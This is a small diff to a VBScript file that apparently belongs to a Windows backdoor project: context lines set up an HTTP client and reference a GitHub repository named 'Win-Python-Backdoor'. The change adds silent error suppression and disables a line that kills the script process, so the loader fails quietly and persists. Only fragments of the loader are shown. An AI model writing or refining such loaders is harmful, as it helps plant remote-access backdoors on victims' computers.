@@ -1,3 +1,4 @@
+On Error Resume Next
 set xmlhttp = createobject ("Msxml2.ServerXMLHTTP")
 dim url,mac
   'url="https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/"
@@ -53,7 +54,7 @@ dim arr
       WScript.Sleep 100
       
   next
-oShell.run "taskkill /f /im wscript.exe"
+rem oShell.run "taskkill /f /im wscript.exe"
 'dim WMI:  set WMI = GetObject("winmgmts:\\.\root\cimv2")
 'dim Nads: set Nads = WMI.ExecQuery("Select * from Win32_NetworkAdapter where physicaladapter=true") 
 'dim nad
